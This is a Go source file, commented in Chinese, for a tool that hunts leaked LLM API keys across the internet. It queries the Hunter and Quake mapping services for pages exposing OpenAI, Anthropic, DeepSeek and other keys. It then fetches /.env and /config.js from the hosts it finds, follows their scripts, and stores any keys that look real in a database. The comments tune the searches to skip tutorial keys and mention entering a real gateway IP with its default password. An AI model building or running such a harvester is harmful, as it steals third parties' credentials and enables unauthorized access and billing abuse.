package llmhunt

import (
	"context"
	"errors"
	"fmt"
	"net/url"
	"strings"
	"sync"
	"time"
)

// 泄漏文件狩猎：不猜路径，直接问空间测绘"哪些 URL 的响应体里有 key"。
//
// 性能策略：跨主机**并发**（默认 8 路），不再为每个 URL 睡 2 秒；但同一台主机仍然
// 串行 + 最小间隔 —— 那是防止把单个站点打死的底线，不是可有可无的礼貌。
// 命中 429/403 立即放弃该主机。

const (
	leakPerQuery  = 10
	leakMaxURL    = 150
	leakBodyLimit = 512 * 1024
	leakWorkers   = 8
	// leakPerHostGap 是同一主机两次请求之间的最小间隔（不同主机之间不等待）。
	leakPerHostGap = 250 * time.Millisecond
	// leakMaxScripts 是每个泄漏页面上再跟进的同源脚本数：key 常在内联的 JS 里。
	leakMaxScripts = 2
	// leakSeenTTL 是「已成功抓过」的 URL 记忆有效期：到期后允许重抓。
	// 泄漏页面会更新（换了 key、改了配置），永久跳过等于把还活着的目标丢掉。
	leakSeenTTL = 24 * time.Hour
	// leakSeenMax 是记忆表上限，超了就剪掉最旧的一半。
	leakSeenMax = 4000
)

// leakQuery 是一条"找泄漏"的查询。
type leakQuery struct {
	query string
	label string
}

// 查询词刻意收紧：裸查 `body="OPENAI_API_KEY"` 命中的大多是教程/示例/Demo 页，
// 里面的 key 是写死的占位串，验出来全是 401。组合条件要求"有 key 赋值 且 有真实
// API 调用特征"，把假 key 页面压下去。
var hunterLeakQueries = []leakQuery{
	{`web.body="OPENAI_API_KEY" && web.body="api.openai.com"`, "OpenAI 生产配置"},
	{`web.body="sk-proj-" && web.body="chat/completions"`, "OpenAI 生产调用"},
	{`web.body="ANTHROPIC_API_KEY" && web.body="api.anthropic.com"`, "Anthropic 生产配置"},
	{`web.body="DEEPSEEK_API_KEY" && web.body="api.deepseek.com"`, "DeepSeek 生产配置"},
	{`web.body="ZHIPUAI_API_KEY" && web.body="open.bigmodel.cn"`, "智谱 GLM 生产配置"},
	{`web.body="MOONSHOT_API_KEY" || web.body="api.moonshot.cn"`, "月之暗面 Kimi"},
}

var quakeLeakQueries = []leakQuery{
	// 网关优先（app 精确指纹，实测命中：93.123.118.92:44444 默认口令直接进）。
	// body 组合词查询换成 app 字段——教程页彻底消失，候选全是真实网关。
	{`app:"one-api"`, "one-api 网关"},
	{`app:"new-api"`, "new-api 网关"},
	{`body="OPENAI_API_KEY" && body="api.openai.com"`, "OpenAI 生产配置"},
	{`body="DEEPSEEK_API_KEY" && body="api.deepseek.com"`, "DeepSeek 生产配置"},
	{`body="sk-ant-api03-"`, "Anthropic 新式 key"},
}

// leakConfigPaths 是 Quake 命中后值得一试的配置路径（每台 2 个，够用且不吵）。
var leakConfigPaths = []string{"/.env", "/config.js"}

// huntLeaks 收集候选 URL 后并发抓取，返回 (抓取数, 新增 key 数, 首个失败原因)。
func (s *Scanner) huntLeaks(ctx context.Context) (int, int, error) {
	k := loadProviderKeys()
	if k.Hunter == "" && k.Quake == "" {
		s.logf("未配置 Hunter/Quake key，跳过泄漏文件狩猎")
		return 0, 0, errors.New("未配置 Hunter/Quake key")
	}

	// ① 先把候选 URL 全收集出来（这一步很快：只打测绘 API）
	//
	// 跨轮记忆：**只有真正抓成功过的** URL 才算"已处理"，而且带 TTL（24 小时）。
	//
	// 旧实现是在**收集阶段**就把候选标成"已抓过"，于是第 1 轮之后候选集被自己
	// 清空：Hunter/Quake 查的是静态数据集，每轮返回同一批 URL，全被跳过 →
	// 后面每一轮都是"抓取 0 个 URL"（线上实测连续空转了 477 轮），白烧测绘 API
	// 配额，还把自己打到限流。抓失败（超时/被拒）不该算"已处理"，下一轮要能重试。
	if s.seenLeak == nil {
		s.seenLeak = map[string]time.Time{}
	}
	s.pruneSeenLeak()
	cands := make([]string, 0, leakMaxURL)
	seen := map[string]bool{}
	add := func(u string) {
		if u == "" || seen[u] || len(cands) >= leakMaxURL {
			return
		}
		if s.leakAlreadyHandled(u) {
			return // 最近成功抓过：这轮不重复发请求
		}
		seen[u] = true
		cands = append(cands, u)
	}

	// ③ 深挖已发现站点（deep-dive）：llm_assets 里的已知网关/泄漏站每轮重新
	// 探测一轮（绕过 seenLeak）。这些站点是"已被证明有 key"的，值得多花预算；
	// 数据源（Quake/Hunter）的新候选反而是小时级才更新一次。
	for _, st := range s.knownLeakSites(ctx, 12) {
		if ctx.Err() != nil || len(cands) >= leakMaxURL {
			break
		}
		if seen[st] {
			continue
		}
		seen[st] = true
		cands = append(cands, st)
	}

	var lastErr error
	if k.Hunter != "" {
		for _, lq := range hunterLeakQueries {
			if ctx.Err() != nil {
				break
			}
			urls, herr := hunterLeakURLs(ctx, k.Hunter, lq.query, leakPerQuery)
			if herr != nil {
				lastErr = herr
				s.logf("泄漏狩猎：Hunter 查询失败（%s）：%v", lq.label, herr)
				break // 限流/配额问题就别继续打剩下几条了
			}
			for _, u := range urls {
				add(u)
			}
		}
	}
	if k.Quake != "" && len(cands) < leakMaxURL {
		for _, lq := range quakeLeakQueries {
			if ctx.Err() != nil {
				break
			}
			hosts, qerr := quakeSearch(ctx, k.Quake, lq.query, leakPerQuery)
			if qerr != nil {
				lastErr = qerr
				s.logf("泄漏狩猎：Quake 查询失败（%s）：%v", lq.label, qerr)
				continue
			}
			for _, hp := range hosts {
				for _, p := range leakConfigPaths {
					add(fmt.Sprintf("http://%s:%d%s", hp.host, hp.port, p))
				}
			}
		}
	}
	if len(cands) == 0 {
		if lastErr != nil {
			s.logf("泄漏狩猎：没有候选 URL（%v）", lastErr)
		} else {
			s.logf("泄漏狩猎：测绘未返回候选 URL")
		}
		return 0, 0, lastErr
	}
	s.logf("泄漏狩猎：%d 个候选 URL，开始并发抓取（%d 路）", len(cands), leakWorkers)

	// ② 并发抓取：跨主机并行，同主机串行 + 最小间隔
	var (
		mu        sync.Mutex
		hostLock  = map[string]*sync.Mutex{}
		hostLast  = map[string]time.Time{}
		fetched   int
		found     int
		wg        sync.WaitGroup
		sem       = make(chan struct{}, leakWorkers)
		hostGuard = func(host string) {
			mu.Lock()
			l, ok := hostLock[host]
			if !ok {
				l = &sync.Mutex{}
				hostLock[host] = l
			}
			mu.Unlock()
			l.Lock()
			mu.Lock()
			if t, ok := hostLast[host]; ok {
				if d := leakPerHostGap - time.Since(t); d > 0 {
					mu.Unlock()
					time.Sleep(d)
					mu.Lock()
				}
			}
			hostLast[host] = time.Now()
			mu.Unlock()
		}
		hostUnlock = func(host string) {
			mu.Lock()
			if l, ok := hostLock[host]; ok {
				l.Unlock()
			}
			mu.Unlock()
		}
	)

	for _, u := range cands {
		if ctx.Err() != nil {
			break
		}
		sem <- struct{}{}
		wg.Add(1)
		go func(raw string) {
			defer wg.Done()
			defer func() { <-sem }()
			host := hostOf(raw)
			hostGuard(host)
			defer hostUnlock(host)

			st, body, _ := s.get(ctx, raw, leakBodyLimit)
			mu.Lock()
			fetched++
			mu.Unlock()
			if st == 403 || st == 418 || st == 429 {
				return // 站点在拒绝：这台不再碰（不记入"已处理"，下轮可再试）
			}
			if st != 200 || body == "" {
				return // 抓失败：同样不记，下一轮重试
			}
			// 真正抓到了才记"已处理"，并记时间（TTL 到期后允许重抓）。
			s.markLeakHandled(raw)
			// 文档/示例页直接跳过：这类页面里的 key 全是教程占位串，
			// 验出来全是 401，还占验证预算。
			if looksLikeDocPage(body) {
				return
			}
			n := s.extractKeysFrom(raw, body, "leak-url")
			// 首页里 key 往往在它引用的 JS 里：跟进同源脚本。
			// 注意：此时已经持有 host 的锁（defer hostUnlock），不能再 hostGuard——
			// 同一个 mutex 重入会自锁死（线上踩过：整轮狩猎永久卡住、Stop 也停不掉）。
			for _, js := range scriptSources(body, raw, leakMaxScripts) {
				st2, b2, _ := s.get(ctx, js, leakBodyLimit)
				if st2 == 200 && b2 != "" {
					n += s.extractKeysFrom(js, b2, "leak-js")
				}
			}
			if n > 0 {
				mu.Lock()
				found += n
				mu.Unlock()
			}
		}(u)
	}
	wg.Wait()
	return fetched, found, lastErr
}

// leakAlreadyHandled 报告这个 URL 最近是否已经成功抓过（TTL 内不再重复发请求）。
//
// 语义要点：只有**抓成功**的 URL 才会进记忆表；抓失败（超时/被拒/非 200）
// 不进表，所以下一轮还会重试。记忆带 TTL：泄漏页面会更新，永久跳过等于把
// 还活着的目标丢掉。
func (s *Scanner) leakAlreadyHandled(u string) bool {
	s.mu.Lock()
	defer s.mu.Unlock()
	at, ok := s.seenLeak[u]
	return ok && time.Since(at) < leakSeenTTL
}

// markLeakHandled 记下"这个 URL 抓过了"（带时间，用于 TTL）。
func (s *Scanner) markLeakHandled(u string) {
	s.mu.Lock()
	defer s.mu.Unlock()
	if s.seenLeak == nil {
		s.seenLeak = map[string]time.Time{}
	}
	s.seenLeak[u] = time.Now()
}

// hostOf 取 URL 的主机（没有端口），用于同一主机的串行保护。
func hostOf(raw string) string {
	u, err := url.Parse(raw)
	if err != nil {
		return raw
	}
	return u.Hostname()
}

// hunterLeakURLs 跑一条 Hunter 查询，取出结果里的 URL。
func hunterLeakURLs(ctx context.Context, key, query string, size int) ([]string, error) {
	pageSize := 10
	if size > 10 {
		pageSize = 20
	}
	search := b64(query)
	u := fmt.Sprintf("https://hunter.qianxin.com/openApi/search?api-key=%s&search=%s&page=1&page_size=%d&is_web=3",
		url.QueryEscape(key), url.QueryEscape(search), pageSize)
	body, err := httpGetJSON(ctx, u, nil)
	if err != nil {
		return nil, err
	}
	var v struct {
		Code int    `json:"code"`
		Msg  string `json:"message"`
		Data struct {
			Arr []struct {
				URL string `json:"url"`
			} `json:"arr"`
		} `json:"data"`
	}
	if jsonUnmarshal(body, &v) != nil {
		return nil, fmt.Errorf("Hunter 响应解析失败")
	}
	// Hunter 用 body 里的 code 表达业务错误：429 是限流（"请求太多啦"），
	// 400 是查询语法问题。老实现一律当成"没结果"，于是限流看起来像"这轮没料"，
	// 持续狩猎会一直空转并把自己打死在限流里。
	if v.Code != 200 {
		msg := v.Msg
		if msg == "" {
			msg = fmt.Sprintf("code %d", v.Code)
		}
		return nil, fmt.Errorf("Hunter 返回 %d：%s", v.Code, msg)
	}
	var out []string
	for _, a := range v.Data.Arr {
		if strings.HasPrefix(a.URL, "http") {
			out = append(out, a.URL)
			if len(out) >= size {
				break
			}
		}
	}
	return out, nil
}

// docPageWords 命中越多越像文档/教程页：这类页面里的 key 是讲解用的假串。
var docPageWords = []string{
	"readme", "documentation", "getting started", "tutorial", "example usage",
	"quickstart", "安装教程", "使用文档", "示例代码", "教程",
}

// looksLikeDocPage 粗筛文档页：标题/正文出现 ≥2 个文档特征词就跳过。
func looksLikeDocPage(body string) bool {
	lower := strings.ToLower(body)
	hit := 0
	for _, w := range docPageWords {
		if strings.Contains(lower, w) {
			hit++
			if hit >= 2 {
				return true
			}
		}
	}
	return false
}

// extractKeysFrom 从任意 URL 的响应体里提 key，并标来源。
func (s *Scanner) extractKeysFrom(srcURL, body, sourceKind string) int {
	n := 0
	for _, kp := range keyPatterns {
		for _, m := range kp.re.FindAllString(body, 20) {
			if !looksLikeRealKey(m) {
				continue
			}
			if ok, _ := s.pgKeyInsert(srcURL, kp.name, m, sourceKind); ok {
				n++
			}
		}
	}
	if n > 0 {
		s.mu.Lock()
		s.keys += n
		s.mu.Unlock()
	}
	return n
}

// knownLeakSites 从 llm_assets 取已发现的站点（最近命中的优先），供深挖。
// 这些站点已证明泄漏过 key/配置，是重复价值最高的目标。
func (s *Scanner) knownLeakSites(ctx context.Context, limit int) []string {
	rows, err := s.pg.Query(`SELECT url FROM llm_assets
WHERE last_seen > now() - interval '7 days'
ORDER BY last_seen DESC LIMIT $1`, limit)
	if err != nil {
		return nil
	}
	defer rows.Close()
	var out []string
	for rows.Next() {
		var u string
		if rows.Scan(&u) == nil && u != "" {
			out = append(out, u)
		}
	}
	return out
}
